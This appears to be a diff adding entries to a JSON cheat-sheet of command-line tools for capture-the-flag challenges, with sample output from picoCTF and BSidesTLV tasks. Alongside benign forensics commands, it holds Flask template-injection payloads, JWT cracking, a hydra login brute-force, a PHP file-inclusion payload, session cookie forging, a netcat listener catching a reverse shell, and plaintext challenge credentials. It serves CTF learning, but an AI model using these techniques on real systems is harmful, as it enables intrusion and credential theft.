+      "10",
+      "No",
+      "{{config}}",
+      "Template Injection: Dump Flask configuration",
+      "https://flask.palletsprojects.com/en/1.0.x/api/#configuration",
+      "\u003cConfig {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}\u003e"
+    ],
+    [
+      "Forensics",
+      "Images",
+      "31",
+      "No",
+      "pngcheck -v -f \u003cimage.png\u003e",
+      "pngcheck verifies the integrity of PNG files.\n\n-f : Force continuation even after major errors\n-v : Verbose Output",
+      "http://manpages.ubuntu.com/manpages/bionic/man1/pngcheck.1.html",
+      "# pngcheck -v -f fixed.png\nFile: fixed.png (202940 bytes)\n  chunk IHDR at offset 0x0000c, length 13\n    1642 x 1095 image, 24-bit RGB, non-interlaced\n  chunk sRGB at offset 0x00025, length 1\n    rendering intent = perceptual\n  chunk gAMA at offset 0x00032, length 4: 0.45455\n  chunk pHYs at offset 0x00042, length 9: 2852132389x5669 pixels/meter\n  CRC error in chunk pHYs (computed 38d82c82, expected 495224f0)\n:  invalid chunk length (too large)\nERRORS DETECTED in fixed.png"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "110",
+      "No",
+      "binwalk -R \"\u003cstring\u003e\" \u003cbinary\u003e",
+      "Search for locations of string in binary.",
+      "https://github.com/ReFirmLabs/binwalk",
+      "# binwalk -R \"IDAT\" fixed.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n87            0x57            Raw signature (IDAT)\n65544         0x10008         Raw signature (IDAT)\n131080        0x20008         Raw signature (IDAT)\n196616        0x30008         Raw signature (IDAT)"
+    ],
+    [
+      "Passwords",
+      "john",
+      "25",
+      "No",
+      "jwt2john.py \u003cjwt\u003e",
+      "Convert JWT to a format John can crack.",
+      "https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature",
+      "python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y \u003e jwt.john"
+    ],
+    [
+      "Passwords",
+      "john",
+      "45",
+      "No",
+      "john \u003cpassword_file\u003e --wordlist=\u003cword_list\u003e",
+      "Attempt to crack password using a dictionary attack.",
+      "https://manpages.debian.org/jessie/john/john.8.en.html",
+      "root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# ~/utils/john/run/john jwt.john  --wordlist=/root/utils/dictionaries/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])\nWarning: OpenMP is disabled; a non-OpenMP build may be faster\nPress 'q' or Ctrl-C to abort, almost any other key for status\nilovepico        (?)\n1g 0:00:00:05 DONE (2019-10-13 14:44) 0.1996g/s 1476Kp/s 1476Kc/s 1476KC/s ilovepinkxxx..ilovepatopollo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed"
+    ],
+    [
+      "Network and Web",
+      "Flask",
+      "11",
+      "No",
+      "{{session}}",
+      "Template Injection: Dump Flask session",
+      "https://flask.palletsprojects.com/en/1.0.x/api/#sessions",
+      "\u003cSecureCookieSession {'_fresh': True, '_id': '3898c6835dcd0270702e6730af6bfe5706c798e5239b48c704db909659fbfba4610afd8be05b0a827eda02cb65fe7dc75a2f84325654bddbbbc922a3c5e4f79d', 'csrf_token': '4eff1dd062289b5e4144c3a136d6516ac2430ad9', 'dark_secret': 'picoCTF{its_a_me_your_flag5c0e0ae8}', 'user_id': '3'}\u003e"
+    ],
+    [
+      "Network and Web",
+      "Flask",
+      "20",
+      "No",
+      "flask_session_cookie_manager3.py decode -s \u003csecret\u003e -c \u003ccookie\u003e",
+      "Decode Flask cookie.",
+      "https://github.com/noraj/flask-session-cookie-manager",
+      "# c=.eJwlz01qAzEMQOG7eJ2FrV8rlxksWaKl0MJMsiq9ewI9wIPv_bajzrw-2v1xPvPWjs_d7s2oyhZKMuvWRaG5t0lIUJnN3jt31k7u5emTF8gyU89hsIcKgc_ZR6DtLMYOYzDhnrrUapoQaRlwLjIK4aANDEHqIqPIV7u1uM46Hj9f-f32qK5wMcG5MYeiR6Qr9EBWzHCLTJjA7-555fk_ge3vBWc8PpY.XaXtmg.iKsUADWNOPFQ4iKm3eYHoF4v0qI\n\n# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py decode -s '9806d62bb5f4986c09a3872abf448e85' -c \"$c\"\n{'_fresh': True, '_id': '94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '3'}"
+    ],
+    [
+      "Network and Web",
+      "Flask",
+      "21",
+      "No",
+      "flask_session_cookie_manager3.py encode -s \u003csecret\u003e -t \u003cnew_object\u003e",
+      "Encode Flask cookie.",
+      "https://github.com/noraj/flask-session-cookie-manager",
+      "# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s '9806d62bb5f4986c09a3872abf448e85' -t \"{'_fresh': True, '_id': '94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '2'}\"\n.eJwlz0lqAzEQQNG7aO2FVKpB5cs0qomEQALd9irk7jbkAB_e_21HnXl9tPvjfOatHZ_R7k2xSvfkJJKQjS4ZoezsWKqr906dpKNZWdqiDbxVxXIoxBBGsLX68KmRRbPDGIQzlmzRWsqIUgqUGxWdyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY"
+    ],
+    [
+      "Network and Web",
+      "Logins",
+      "0",
+      "No",
+      "hydra -L \u003cusername_list\u003e -P \u003cpassword_list\u003e -f -F \u003cdomain\u003e -s \u003cport\u003e http-post-form \"\u003curi\u003e:\u003cusername_field\u003e=^USER^&\u003cpassword_field\u003e=^PASS^:\u003cerror_string\u003e\" -v -R\n",
+      "Brute force logins and passwords.",
+      "https://github.com/vanhauser-thc/thc-hydra",
+      "# ~/utils/thc-hydra/hydra -L ~/utils/dictionaries/top-usernames-shortlist.txt -P ~/utils/dictionaries/10-million-password-list-top-10000.txt -f -F 2019shell1.picoctf.com -s 49879 http-post-form \"/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login\" -v -R\nHydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\n[INFORMATION] reading restore file ./hydra.restore\n[WARNING] options after -R are now honored (since v8.6)\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-04 08:22:29\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task\n[DATA] attacking http-post-form://2019shell1.picoctf.com:49879/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login\n[VERBOSE] Resolving addresses ... [VERBOSE] resolving done\n[STATUS] 8978.00 tries/min, 8978 tries in 00:01h, 161022 to do in 00:18h, 16 active\n[STATUS] 3392.67 tries/min, 10178 tries in 00:03h, 159822 to do in 00:48h, 16 active\n[STATUS] 1823.86 tries/min, 12767 tries in 00:07h, 157233 to do in 01:27h, 16 active\n[STATUS] 1196.73 tries/min, 17951 tries in 00:15h, 152049 to do in 02:08h, 16 active\n[STATUS] 912.06 tries/min, 28274 tries in 00:31h, 141726 to do in 02:36h, 16 active\n[VERBOSE] Page redirected to http://:49879/index.php?file=login\n[49879][http-post-form] host: 2019shell1.picoctf.com   login: guest   password: guest\n[STATUS] attack finished for 2019shell1.picoctf.com (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-04 09:02:01"
+    ],
+    [
+      "Network and Web",
+      "PHP",
+      "0",
+      "No",
+      "php://filter/read=convert.base64-encode/resource",
+      "Base64-encode resource.\n",
+      "https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md",
+      "# curl https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/read=convert.base64-encode/resource=admin\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003clink href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\"\u003e\n\u003clink href=\"style.css\" rel=\"stylesheet\"\u003e\n\u003cscript src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\" integrity=\"sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n\u003c/head\u003ePD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg==\u003c/html\u003e"
+    ],
+    [
+      "Executables",
+      "Daemon",
+      "0",
+      "No",
+      "xinetd -d -dontfork -f \u003cconfig_file\u003e",
+      "Allow connecting to an executable via the network.",
+      "https://linux.die.net/man/8/xinetd",
+      "# cat xinetd.conf\nservice my_srv\n{\n    socket_type = stream\n    protocol    = tcp\n    port        = 12345\n    type        = UNLISTED\n    wait        = no\n    user        = root\n    server      = /media/sf_CTFs/36c3/minifd/fd\n}\n# xinetd -d -dontfork -f xinetd.conf\nService defaults\n        Bind = All addresses.\n        Only from: All sites\n        No access: No blocked sites\n        No logging\n\nService configuration: my_srv\n        id = my_srv\n        flags = IPv6\n        type = UNLISTED\n        socket_type = stream\n        Protocol (name,number) = (tcp,6)\n        port = 12345\n        wait = no\n        user = 0\n        Groups = no\n        PER_SOURCE = -1\n        Bind = All addresses.\n        Server = /media/sf_CTFs/36c3/minifd/fd\n        Server argv = fd\n        Only from: All sites\n        No access: No blocked sites\n        No logging\n\n20/1/3@15:02:13: DEBUG: 896 {cnf_start_services} Started service: my_srv\n20/1/3@15:02:13: DEBUG: 896 {cnf_start_services} pfds_last = 1, services_started = 1\n20/1/3@15:02:13: NOTICE: 896 {main} 2.3.15.3 started with libwrap loadavg labeled-networking options compiled in.\n20/1/3@15:02:13: NOTICE: 896 {main} Started working: 1 available service\n20/1/3@15:02:13: DEBUG: 896 {main_loop} active_services = 1"
+    ],
+    [
+      "Network and Web",
+      "SMB",
+      "10",
+      "No",
+      "smbclient -L \u003cip\u003e -U \u003cuser\u003e%\u003cpassword\u003e",
+      "List Samba Details.",
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
+      "# smbclient -L 13.89.33.39 -U user07%ClngP@ss\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        D$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        user07          Disk"
+    ],
+    [
+      "Network and Web",
+      "SMB",
+      "50",
+      "No",
+      "smbmap -H \u003cip\u003e -u \u003cuser\u003e -p \u003cpassword\u003e",
+      "List Samba Details.",
+      "http://manpages.ubuntu.com/manpages/eoan/man1/smbmap.1.html",
+      "# smbmap -H 13.89.33.39 -u user07 -p ClngP@ss\n[+] Finding open SMB ports....\n[+] User SMB session established on 13.89.33.39...\n[+] IP: 13.89.33.39:445 Name: 13.89.33.39\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        D$                                                      NO ACCESS       Default share"
+    ],
+    [
+      "Network and Web",
+      "SMB",
+      "20",
+      "No",
+      "smbclient //\u003cip\u003e/\u003cfolder\u003e -U \u003cuser\u003e%\u003cpassword\u003e -m SMB2 -t 120",
+      "Access SMB share folder.",
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
+      "# smbclient //13.89.33.39/user07 -U user07%ClngP@ss -m SMB2 -t 120\nTry \"help\" to get a list of possible commands.\nsmb: \\\u003e cd Downloads\nsmb: \\Downloads\\\u003e dir\n  .                                   D        0  Wed Feb  5 17:29:40 2020\n  ..                                  D        0  Wed Feb  5 17:29:40 2020\n  Challenge2.pcap.rar                 A 82637414  Wed Jan 29 17:03:49 2020\n  classified_document.txt             A       44  Wed Jan 29 17:11:21 2020\n  desktop.ini                       AHS      282  Tue Jan 14 11:31:50 2020\n\n                33147387 blocks of size 4096. 27683659 blocks available\nsmb: \\Downloads\\\u003e get classified_document.txt\ngetting file \\Downloads\\classified_document.txt of size 44 as classified_document.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)"
+    ],
+    [
+      "Network and Web",
+      "SMB",
+      "60",
+      "No",
+      "smbget -U \u003cuser\u003e -D smb://\u003cip\u003e/\u003cpath\u003e",
+      "Get file over SMB.",
+      "https://www.samba.org/samba/docs/current/man-html/smbget.1.html",
+      "# smbget -U user07 -D smb://13.89.33.39/user07/Downloads/Challenge2.pcap.rar\nPassword for [user07] connecting to //user07/13.89.33.39:\nUsing workgroup WORKGROUP, user user07"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "60",
+      "No",
+      "tshark -qz io,phs -r \u003cpcap\u003e",
+      "Display Protocol Statistics.",
+      "https://www.wireshark.org/docs/man-pages/tshark.html",
+      "# tshark -qz io,phs -r Challenge2.pcapng\nRunning as user \"root\" and group \"root\". This could be dangerous.\n\n===================================================================\nProtocol Hierarchy Statistics\nFilter:\n\neth                                      frames:212107 bytes:148758200\n  arp                                    frames:3542 bytes:209514\n  ip                                     frames:205803 bytes:148291639\n    tcp                                  frames:180934 bytes:145976750\n      ssl                                frames:46939 bytes:41069107\n        tcp.segments                     frames:18609 bytes:24518037\n          ssl                            frames:10615 bytes:15126013"
+    ],
+    [
+      "Forensics",
+      "Diff",
+      "11",
+      "No",
+      "cmp -l --ignore-initial=\u003cskip1\u003e:\u003cskip2\u003e \u003cfile1\u003e \u003cfile2\u003e",
+      "Compare two files byte by byte, ignore initial offsets.",
+      "https://linux.die.net/man/1/cmp",
+      "# cmp -l output.bin output/jpg/00000000.jpg\ncmp: EOF on output/jpg/00000000.jpg after byte 166799\n# cmp -l --ignore-initial=166799:0 output.bin output/jpg/00000325.jpg\ncmp: EOF on output/jpg/00000325.jpg after byte 2192\n# cmp -l --ignore-initial=$((166799+2192)):0 output.bin output/jpg/00000330.jpg\ncmp: EOF on output/jpg/00000330.jpg after byte 34844"
+    ],
+    [
+      "Network and Web",
+      "SSH",
+      "10",
+      "No",
+      "ssh -N -L \u003cport\u003e:\u003cbind_addr\u003e:\u003cbind_port\u003e \u003cuser\u003e@\u003chost\u003e",
+      "SSH Port Tunneling.",
+      "https://linux.die.net/man/1/ssh",
+      "# ssh -N -L 9999:10.0.0.7:80 cuser@104.43.243.221\n# curl http://localhost:9999\n\n\n# ssh -N -L localhost:9999:/var/run/docker.sock bsidestlv@docker-manager.ctf.bsidestlv.com -p 8000\n# curl -s http://localhost:9999/version"
+    ],
+    [
+      "Network and Web",
+      "SSH",
+      "50",
+      "No",
+      "sshpass -p \u003cpassword\u003e",
+      "Allows using plaintext SSH password.",
+      "https://linux.die.net/man/1/sshpass",
+      "# sshpass -p 'Sec0ndPh@se' cuser@104.43.243.221"
+    ],
+    [
+      "Network and Web",
+      "Netcat",
+      "10",
+      "No",
+      "nc -lvp \u003cport\u003e",
+      "Opening listening port.",
+      "https://linux.die.net/man/1/nc",
+      "$ nc -lvp 4445\nListening on [0.0.0.0] (family 0, port 4445)\nConnection from 10.0.0.7 36238 received!\n/bin/sh: 0: can't access tty; job control turned off\n$ ls\ngallery\nindex.html\nindex.php\npages\npics\ntest.php\nweb.css"
+    ],
+    [
+      "Forensics",
+      "PDFs",
+      "20",
+      "No",
+      "pdftotext \u003cfile\u003e",
+      "PDF to text.",
+      "https://linux.die.net/man/1/pdftotext",
+      "# pdftotext cybertank-research.pdf\n# cat cybertank-research.txt | grep ID\nCONFIDENTIAL\nID: rd42/tlv/2020"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "55",
+      "No",
+      "tshark -r \u003cpcap\u003e -o \"tcp.desegment_tcp_streams: TRUE\" -o \"tcp.no_subdissector_on_error: FALSE\" --export-objects \"http,exported_objects\"",
+      "Extract HTTP objects.",
+      "https://www.wireshark.org/docs/man-pages/tshark.html",
+      "# tshark -r cybertank.pcap -o \"tcp.desegment_tcp_streams: TRUE\" -o \"tcp.no_subdissector_on_error: FALSE\" --export-objects \"http,exported_objects\" | grep zip\nRunning as user \"root\" and group \"root\". This could be dangerous.\n  784  29.321267 192.168.164.1 → 203.0.113.9  HTTP 629 GET /employees/key_research_server.zip HTTP/1.1  50285 80\n  788  29.325097  203.0.113.9 → 192.168.164.1 HTTP 89 HTTP/1.1 200 OK  (application/zip) 80 50285"
+    ],
+    [
+      "Network and Web",
+      "SSH",
+      "2",
+      "No",
+      "ssh -i \u003cprivate_key\u003e \u003cuser\u003e@\u003chost\u003e",
+      "Connect to SSH using private key.",
+      "https://linux.die.net/man/1/ssh",
+      "# ssh -i CyberTank_Research_Server.pem developer@63.32.136.47\nLast login: Tue Jan 28 18:54:25 2020 from 109-186-108-242.bb.netvision.net.il"
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "50",
+      "No",
+      "ewfmount \u003cfile_system\u003e \u003cmount path\u003e",
+      "Mount data stored in EWF files.",
+      "https://www.mankier.com/1/ewfmount\nhttps://www.andreafortuna.org/2018/04/11/how-to-mount-an-ewf-image-file-e01-on-linux/",
+      "# ewfmount checkyourself.E01 ./rawimage/\newfmount 20140807\n\n# fdisk -l rawimage/ewf1\nDisk rawimage/ewf1: 40 GiB, 42949672960 bytes, 83886080 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: E1EE055D-4293-4322-9DB1-11480F3861EB\n\nDevice            Start      End  Sectors  Size Type\nrawimage/ewf1p1    2048  1085439  1083392  529M Windows recovery environment\nrawimage/ewf1p2 1085440  1288191   202752   99M EFI System\nrawimage/ewf1p3 1288192  1320959    32768   16M Microsoft reserved\nrawimage/ewf1p4 1320960 83884031 82563072 39.4G Microsoft basic data\n# mkdir mountpoint\n# mount ./rawimage/ewf1 ./mountpoint -o ro,loop,show_sys_files,streams_interace=windows,offset=$((1320960*512))\n\n...\n\n# umount ./mountpoint\n# umount ./rawimage"
+    ],
+    [
+      "Network and Web",
+      "SSH",
+      "0",
+      "No",
+      "ssh \u003cuser\u003e@\u003chost\u003e",
+      "SSH to host.",
+      "https://linux.die.net/man/1/ssh",
+      "# ssh bsidestlv@docker-manager.ctf.bsidestlv.com"
+    ],
+    [
+      "Network and Web",
+      "SSH",
+      "1",
+      "No",
+      "ssh \u003cuser\u003e@\u003chost\u003e -p \u003cport\u003e",
+      "SSH to host on custom port.",
+      "https://linux.die.net/man/1/ssh",
+      "# ssh bsidestlv@docker-manager.ctf.bsidestlv.com -p 8000"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "cat \u003cjson_file\u003e |  | python -m json.tool",
+      "Pretty print JSON file.",
+      "https://docs.python.org/3/library/json.html",
+      "$ echo '{\"json\": \"obj\"}' | python -m json.tool\n{\n    \"json\": \"obj\"\n}"
+    ],
+    [
+      "Forensics",
+      "ESE",
+      "10",
+      "No",
+      "esedbinfo \u003cfile\u003e",
+      "Display information about ESE file.",
+      "https://linux.die.net/man/1/esedbinfo",
+      "# esedbinfo TheTarget | grep \"Table: \"\nTable: 1                        MSysObjects (2)\nTable: 2                        MSysObjectsShadow (3)\nTable: 3                        MSysObjids (6)\nTable: 4                        MSysLocales (7)\nTable: 5                        datatable (8)\n"
+    ],
+    [
+      "Forensics",
+      "ESE",
+      "20",
+      "No",
+      "esedbexport -T \u003ctable\u003e \u003cfile\u003e",
+      "Dump ESE table.",
+      "https://github.com/libyal/libesedb",
+      "# esedbexport -T datatable TheTarget\nesedbexport 20200418\n\nOpening file.\nDatabase type: Unknown.\nExporting table 5 (datatable).\nExport completed."
+    ],
+    [
+      "Network and Web",
+      "TLS",
+      "30",
+      "No",
+      "sslscan \u003chost\u003e",
+      "Scan host for TLS vulnerabilities.",
+      "https://manpages.debian.org/stretch/sslscan/sslscan.1.en.html",
+      "# sslscan vampires.ctf.bsidestlv.com:8001"
     ]
   ]
 }
